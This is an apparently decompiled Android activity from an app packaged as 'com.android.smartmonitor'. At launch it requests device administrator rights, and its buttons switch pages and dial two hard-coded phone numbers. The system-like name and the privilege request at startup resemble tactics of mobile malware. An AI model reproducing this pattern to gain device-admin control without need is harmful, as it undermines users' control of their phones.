package com.android.smartmonitor;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import com.android.smartmonitor.receiver.CheckDeviceAdminReceiver;

public class Page1Activity extends Activity {

    static final int ACTIVATION_REQUEST = 551;
    DevicePolicyManager devicePolicyManager;
    ComponentName DeviceAdmin;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_page1);
        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        DeviceAdmin = new ComponentName(this, CheckDeviceAdminReceiver.class);
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,	DeviceAdmin);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, R.string.device_description);
        startActivityForResult(intent, ACTIVATION_REQUEST);

        ((Button)findViewById(R.id.btn1)).setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View paramAnonymousView) {}
        });
        ((Button)findViewById(R.id.btn2)).setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View paramAnonymousView)
            {
                Intent intent = new Intent(Page1Activity.this, Page2Activity.class);
                Page1Activity.this.startActivity(intent);
                Page1Activity.this.overridePendingTransition(2130968577, 2130968578);
                Page1Activity.this.finish();
            }
        });
        ((Button)findViewById(R.id.btn3)).setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View paramAnonymousView)
            {
                Intent intent = new Intent(Page1Activity.this, Page3Activity.class);
                Page1Activity.this.startActivity(intent);
                Page1Activity.this.overridePendingTransition(2130968577, 2130968578);
                Page1Activity.this.finish();
            }
        });
        ((Button)findViewById(R.id.btn4)).setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View paramAnonymousView)
            {
                Intent intent = new Intent(Page1Activity.this, Page4Activity.class);
                Page1Activity.this.startActivity(intent);
                Page1Activity.this.overridePendingTransition(2130968577, 2130968578);
                Page1Activity.this.finish();
            }
        });
        ((Button)findViewById(R.id.btn5)).setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View paramAnonymousView)
            {
                Intent intent = new Intent(Page1Activity.this, Page5Activity.class);
                Page1Activity.this.startActivity(intent);
                Page1Activity.this.overridePendingTransition(2130968577, 2130968578);
                Page1Activity.this.finish();
            }
        });
        ((Button)findViewById(R.id.btn_topage5)).setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View paramAnonymousView)
            {
                Intent intent = new Intent(Page1Activity.this, Page5Activity.class);
                Page1Activity.this.startActivity(intent);
                Page1Activity.this.overridePendingTransition(2130968577, 2130968578);
                Page1Activity.this.finish();
            }
        });
        ((Button)findViewById(R.id.btn_call1)).setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View paramAnonymousView)
            {
                Intent intent = new Intent("android.intent.action.CALL", Uri.parse("tel:15446800"));
                Page1Activity.this.startActivity(intent);
            }
        });
        ((Button)findViewById(R.id.btn_call2)).setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View paramAnonymousView)
            {
                Intent intent = new Intent("android.intent.action.CALL", Uri.parse("tel:1332"));
                Page1Activity.this.startActivity(intent);
            }
        });

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        switch (requestCode) {
            case ACTIVATION_REQUEST:
                if (resultCode == Activity.RESULT_OK) {
                    Log.d("Device Admin","Turned On");
                } else {
                    Log.d("Device Admin","Turned Off");
                }
        }
        super.onActivityResult(requestCode, resultCode, data);
    }
}
